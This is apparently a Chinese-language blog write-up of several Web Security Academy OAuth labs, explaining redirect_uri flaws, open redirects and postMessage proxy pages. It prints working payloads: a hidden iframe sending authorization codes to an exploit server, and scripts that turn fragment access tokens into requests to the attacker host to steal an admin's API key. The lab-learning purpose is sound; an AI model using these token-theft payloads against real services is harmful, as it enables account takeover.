+<p><strong><code>实验的漏洞根源是</code></strong>：OAuth 授权服务器对 redirect_uri 的校验存在严重缺陷（比如仅校验域名前缀、完全不校验，或存在绕过逻辑）攻击者可以构造恶意的 redirect_uri，诱导已登录 OAuth 的管理员点击授权链接，让授权服务器把管理员的有效授权码直接跳转到攻击者控制的漏洞利用服务器，从而窃取授权码，最终用该授权码登录管理员账号完成攻击</p>
+<p>简单来说就是<code>redirect_uri没有和客户端绑定造成的code泄露</code></p>
+<p>登录过程差不多，只需要关注两个重要的数据包（一对请求响应包）<br><img src="/images/OAuth_authentication/image_44.png" alt="在这里插入图片描述"></p>
+<p>测试，发现<code>redirect_url</code>是可控的<br><img src="/images/OAuth_authentication/image_45.png" alt="在这里插入图片描述"></p>
+<p>还有一个注意的地方：受害者是<code>在登录状态下去触发</code>的恶意链接，原因是code 绑定的是「OAuth 认证服务器的登录用户」</p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://oauth-0a60005303fc3c1380a5247102d40024.oauth-server.net/auth?client_id=mxshbbzz43mg7gchjj3f2&amp;redirect_uri=https://exploit-0a450088039b3cc1802825d00129006b.exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>查看日志<br><img src="/images/OAuth_authentication/image_46.png" alt="在这里插入图片描述"></p>
+<p>修改code（实际上没必要在重发器修改，反而不方便）<br><img src="/images/OAuth_authentication/image_47.png" alt="在这里插入图片描述"></p>
+<p>之后进入面板调用删除接口即可</p>
+<hr>
+<h3 id="0x05-利用开放重定向漏洞窃取-OAuth-访问令牌"><a href="#0x05-利用开放重定向漏洞窃取-OAuth-访问令牌" class="headerlink" title="0x05.利用开放重定向漏洞窃取 OAuth 访问令牌"></a>0x05.利用开放重定向漏洞窃取 OAuth 访问令牌</h3><p>本实验使用 OAuth 服务实现社交账号快捷登录。由于 OAuth 服务端的校验机制存在缺陷，攻击者可以诱导 <strong>访问令牌（access token）</strong> 泄露至客户端应用内的任意页面。<br>实验要求：</p>
+<ul>
+<li><p>找出博客网站上的 ** 开放重定向（Open Redirect）** 漏洞；</p>
+</li>
+<li><p>利用该漏洞窃取管理员账号的 OAuth 访问令牌；</p>
+</li>
+<li><p>借助拿到的访问令牌获取管理员的 API 密钥；</p>
+</li>
+<li><p>通过实验横幅的提交按钮提交密钥，完成实验。</p>
+</li>
+<li><p>重要提示</p>
+<ul>
+<li>你无法只靠在博客站点登录管理员账号，来直接获取 API 密钥。</li>
+</ul>
+</li>
+<li><p>环境约束</p>
+<ul>
+<li>管理员会主动访问你从漏洞利用服务器发来的任意链接，且管理员在 OAuth 认证服务上始终保持已登录状态。</li>
+</ul>
+</li>
+</ul>
+<p>你可使用下方凭证登录自己的社交账号：账号：wiener密码：peter</p>
+<p>提示需要使用重定向，但是这题的重定向与上题的重定向的<code>利用不同</code>，本题<code>无法直接篡改</code>回调域名，<code>依托开放重定向接口+ OAuth 宽松校验组合漏洞</code>，窃取高阶 <code>access_token </code>访问令牌</p>
+<p><strong><code>这种统一开发的重定向的接口的设计初衷是什么？</code></strong></p>
+<blockquote>
+<ol>
+<li><p>客户端内置开放重定向接口</p>
+<blockquote>
+<p>主流网站普遍会开发全局通用跳转接口，核心业务设计目的：</p>
+<ul>
+<li>外链安全统一管控<blockquote>
+<p>网站不允许前端直接暴露第三方外部链接，所有外链访问必须经过站内中转。方便后端统一拦截恶意域名、钓鱼站点、非法资源，做基础风险拦截与内容风控</p>
+</blockquote>
+</li>
+<li>用户安全提示引导<blockquote>
+<p>跳转外部站点前，统一加载中转页，提示用户「即将离开本站，前往第三方网站」，降低钓鱼攻击、恶意下载的风险，提升用户安全意识</p>
+</blockquote>
+</li>
+<li>运营数据统计分析<blockquote>
+<p>通过中转接口记录外链点击量、访问来源、引流渠道，用于运营统计、行为分析、推广效果溯源。</p>
+</blockquote>
+</li>
+<li>路由迭代与旧链接兼容<blockquote>
+<p>网站页面改版、域名更换、旧功能下线后，利用通用重定向接口批量转发旧地址，保证历史链接不失效，减少用户访问异常。</p>
+</blockquote>
+</li>
+<li>灵活快速配置运营活动<blockquote>
+<p>广告、活动、合作推广等外部链接无需修改代码，仅通过修改跳转参数即可快速上线、更换、下线，提升运维效率。</p>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p>OAuth 协议允许回调地址携带自定义 Query 参数</p>
+<blockquote>
+<ul>
+<li>保留用户浏览上下文，精准回流<blockquote>
+<p>用户在商品页、文章页、购物车、个人收藏等页面触发第三方登录，需要在授权登录完成后，自动返回登录前正在浏览的页面，而非强制跳转首页，大幅提升使用体验。</p>
+</blockquote>
+</li>
+<li>区分多业务模块与落地页<blockquote>
+<p>同一套 OAuth 客户端对接论坛、商城、博客等多个业务板块，通过 redirect_uri 附带自定义参数，区分授权完成后的跳转落地位置。</p>
+</blockquote>
+</li>
+<li>留存前置操作状态<blockquote>
+<p>携带来源标识、页面 ID、操作行为等参数，登录后延续用户之前的操作流程，避免操作中断、数据丢失。</p>
+</blockquote>
+</li>
+<li>渠道溯源与流量分流<blockquote>
+<p>附加渠道码、推广标识等参数，实现第三方登录的渠道统计、流量划分与个性化业务配置</p>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p>技巧，抓取登录流程的数据包可以选择性的设置抓取数据包的边界，避免太多数据包影响判断<br><img src="/images/OAuth_authentication/image_48.png" alt="在这里插入图片描述"><br>根据数据包的状态码可以大致指定整个认证流程的跳转关系<br>查看<code>第一个302</code>到<code>第二个302</code>的数据包，可以知道第二个302之前的数据没什么关系<br>查看<code>第二个302</code>到<code>第一个200</code>的数据包，此过程只是不断的设置cookie和一些没有太大关系的参数，可以忽略<br>查看<code>第一个200</code>的数据包内容，发现返回的是一段js代码，实际上就是访问&#x2F;me，其中js代码中固定携带的参数需要注意（token）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">headers</span>: &#123;</span><br><span class="line">     <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &#x27;</span> + token,</span><br><span class="line">     <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>再查看<code>第二个200</code>的数据包，&#x2F;me的回包有json数据，其中包含我们需要的apikey</p>
+<p>由上面的分析可以知道，token是关键</p>
+<p>测试能否修改重定向url<br><img src="/images/OAuth_authentication/image_49.png" alt="在这里插入图片描述"></p>
+<p>继续测试<br><img src="/images/OAuth_authentication/image_50.png" alt="在这里插入图片描述"></p>
+<p>还测试了很多，就是确定死了<code>redirect_uri=https://0a2300f5035fe0f280b8032f00950084.web-security-academy.net/oauth-callback</code></p>
+<p>我们的目标是找到这个<code>blog网站</code>的重定向接口，所以我们需要是看看blog网站的内容，不要局限与登录过程<br><img src="/images/OAuth_authentication/image_51.png" alt="在这里插入图片描述"></p>
+<p>我尝试了 发表评论等功能，然后发现 next功能（即下一片文章的功能）具有重定向功能，继续测试<br><img src="/images/OAuth_authentication/image_52.png" alt="在这里插入图片描述"></p>
+<p>在安全合规的生产环境中，对统一重定向接口做严格白名单过滤是行业强制标准，绝大多数正规企业都会落地；但现实中仍有大量系统存在开放重定向漏洞，核心原因是业务妥协、校验疏漏、遗留系统等问题</p>
+<p><strong><code>业务需求妥协方面</code></strong>：</p>
+<ul>
+<li>运营需要灵活配置活动、广告、合作外链，不想每次修改都走白名单审核流程，因此放开了校验，仅做弱限制（如仅拦截部分恶意域名）；</li>
+<li>业务型跳转接口（如&#x2F;post&#x2F;next?path&#x3D;）被开发者默认是「站内自用」，完全没做域名校验，没想到可被用于外网跳转</li>
+</ul>
+<p><strong><code>遗留系统与快速迭代</code></strong>：</p>
+<ul>
+<li>老系统、开源 CMS、第三方组件自带的重定向接口，默认配置无白名单，开发者未做安全加固；</li>
+<li>创业公司快速上线业务，跳过安全评审，直接照搬开源代码，漏了安全校验。</li>
+</ul>
+<p>现在找到了blog网站的可用的重定向接口 <code>/post/next?path=自定义url</code>，需要与登录认证中的重定向联系起来：<strong><code>目录穿越漏洞</code></strong></p>
+<p><img src="/images/OAuth_authentication/image_53.png" alt="在这里插入图片描述"><br>可以看出是携带access_token跳转的</p>
+<p>不断跳转后，成功访问攻击服务器<br><img src="/images/OAuth_authentication/image_54.png" alt="在这里插入图片描述"></p>
+<p>查看日志，没有看到我的token，是什么原因？<br><img src="/images/OAuth_authentication/image_55.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://0a2300f5035fe0f280b8032f00950084.web-security-academy.net/post/next?path=https%3A%2F%2Fexploit-0aa900280305e0998038028c0106000d.exploit-server.net/exploit#access_token=NnhgSah-AMSUhNxx1zWt5aOGjc5LE_UFGaEjTqMIbOA&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email</span><br><span class="line">其中 #access_token=......</span><br></pre></td></tr></table></figure>
+<p>原因与解析：</p>
+<ul>
+<li>URL 里的 # 片段属于<code>前端私有</code>，不会发给后端</li>
+<li><code>? 参数</code> &#x3D; 公开信息 → 服务器能看到、日志能记录；<code>#hash</code>&#x3D; 浏览器私有信息 → 服务器看不见、日志没有</li>
+<li>浏览器<code>读取 #token</code>  ~&gt; <code>变成?token</code> ~&gt; 重新访问网址：<a target="_blank" rel="noopener" href="https://exploit-xxx/?access_token=123">https://exploit-xxx?access_token=123</a></li>
+</ul>
+<p>攻击服务器js代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://oauth-0a85004203954a8680fd018802cd00b0.oauth-server.net/auth?client_id=bc5af0508j86g0ebso5v9&amp;redirect_uri=https://0a92005703ce4af5806503ce003800d5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a9c00ab03fc4a5d8058023e012a000d.exploit-server.net/exploit&amp;response_type=token&amp;nonce=2082680373&amp;scope=openid profile email</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/OAuth_authentication/image_56.png" alt="在这里插入图片描述"><br>这个数据包发送之后，然后再重定向，最后访问到攻击服务器，但是还是接收不到token 但是，如果直接复制这个url到浏览器访问，就可以收到token，说明我的攻击服务器设置是没有问题的，我无语了。可能是burp的原因待研究。直接解题吧，毁灭吧</p>
+<p>攻击服务器再升级一下，然后模拟受害者点击</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://oauth-0a85004203954a8680fd018802cd00b0.oauth-server.net/auth?client_id=bc5af0508j86g0ebso5v9&amp;redirect_uri=https://0a92005703ce4af5806503ce003800d5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a9c00ab03fc4a5d8058023e012a000d.exploit-server.net/exploit&amp;response_type=token&amp;nonce=-1108280201&amp;scope=openid%20profile%20email&#x27;</span>&#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/OAuth_authentication/image_57.png" alt="在这里插入图片描述"></p>
+<p>获取apikey<br><img src="/images/OAuth_authentication/image_58.png" alt="在这里插入图片描述"></p>
+<p>提交即可</p>
+<hr>
+<h3 id="0x06-通过代理页面窃取-OAuth-访问令牌"><a href="#0x06-通过代理页面窃取-OAuth-访问令牌" class="headerlink" title="0x06.通过代理页面窃取 OAuth 访问令牌"></a>0x06.通过代理页面窃取 OAuth 访问令牌</h3><p>本实验借助一项 OAuth 服务，让用户可以通过社交账号登录。OAuth 服务存在校验逻辑缺陷，攻击者可利用该漏洞，将访问令牌泄露给客户端应用程序上的任意页面。<br>要通关本实验：</p>
+<ul>
+<li>找出客户端应用程序中的另一个漏洞；</li>
+<li>以此漏洞作为代理中转，窃取管理员账号的 OAuth 访问令牌；</li>
+<li>利用窃取到的访问令牌，获取管理员的 API 密钥；</li>
+<li>点击实验横幅中的提交按钮，提交密钥完成通关。</li>
+</ul>
+<p>管理员会打开你从漏洞利用服务器发送的任意链接，且管理员在 OAuth 服务中始终保持登录会话状态。<br>你可以使用以下账号密码，通过个人社交账号登录测试：账号：wiener密码：peter</p>
+<p>根据之前的分析方法，这三个仍然是重要的数据包<br><img src="/images/OAuth_authentication/image_59.png" alt="在这里插入图片描述"></p>
+<p>意料之中 redirect 不可修改，且目录穿越不发挥作用，由上题可知，我们要跳出登录流程的局限性</p>
+<h4 id="父子页面的相关知识"><a href="#父子页面的相关知识" class="headerlink" title="父子页面的相关知识"></a>父子页面的相关知识</h4><ul>
+<li><p>简要概念</p>
+<blockquote>
+<p>对于一个打开的网页，姑且其记为父页面；这个网页中存在其他网页，记为子页面</p>
+</blockquote>
+</li>
+<li><p>关键特性</p>
+<blockquote>
+<ol>
+<li><p>父子页面是两个完全独立的网页</p>
+</li>
+<li><p>各自单独请求服务器、单独加载、单独运行 JS</p>
+</li>
+<li><p>跨域情况下，默认完全隔离</p>
+</li>
+<li><p>浏览器安全规则：</p>
+<blockquote>
+<p>不同网站的页面，不能互相读取地址、不能互相调用代码、不能拿数据。</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<ul>
+<li>为什么需要 postMessage？<blockquote>
+<p>评论区、客服窗口、广告、播放器，经常用 iframe 嵌套<br>但是由于同源策略的存在阻碍了父子页面的通信，所以postMessage实现跨窗口通信 API，就是解决这个问题的</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>信息通信</p>
+<blockquote>
+<p>子页面到父页面</p>
+<blockquote>
+<p>parent.postMessage(要发送的数据, 目标域名)</p>
+</blockquote>
+<p>父页面到子页面</p>
+<blockquote>
+<p>iframe标签.contentWindow.postMessage(数据, 域名)</p>
+</blockquote>
+<p>接收信息的方式都是一样的</p>
+<blockquote>
+<p>window.addEventListener(‘message’, function(e){<br>  &#x2F;&#x2F; e.data  : 对方发过来的内容<br>  &#x2F;&#x2F; e.origin: 发送方的域名（用来做安全校验）<br>  console.log(e.data)<br>  })</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<p>抓包分析<br><img src="/images/OAuth_authentication/image_60.png" alt="在这里插入图片描述"></p>
+<p>实际上，在生成环境中这里存在严格的检查或直接是白名单。</p>
+<p>实际上这一题与上一题的做法差不多，也是存在目录穿越漏洞，利用接口<code>/post/comment/comment-form</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://oauth-0aee007b046763a8817b56b1027e0020.oauth-server.net/auth?client_id=z5ezyto6itb9oit1w3gjt&amp;redirect_uri=https://0a56003904db633781fc584c00e300c3.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;response_type=token&amp;nonce=-8049157&amp;scope=openid%20profile%20email&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="title function_">fetch</span>(<span class="string">&quot;/&quot;</span> + <span class="built_in">encodeURIComponent</span>(e.<span class="property">data</span>.<span class="property">data</span>))</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;, <span class="literal">false</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是我构造的一个页面，比如受害者点击了它，会自动触发访问src，然后返回会将返回的数据传输回来，其中的数据是带token的</p>
+<p><img src="/images/OAuth_authentication/image_61.png" alt="在这里插入图片描述"></p>
+<p>复制token，再次发包<br><img src="/images/OAuth_authentication/image_62.png" alt="在这里插入图片描述"></p>
+<p>复制提交即可</p>
+<hr>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="OAuth authentication">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a href="/2026/04/20/邮箱地址解析/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/04/13/CORS/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-04-15
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>33</span></a></li> <li><a href="/categories/网络安全/漏洞/">漏洞<span>11</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/">WEB安全<span>7</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/Top10/">Top10<span>7</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/认证/">认证<span>2</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">33</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">5</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" 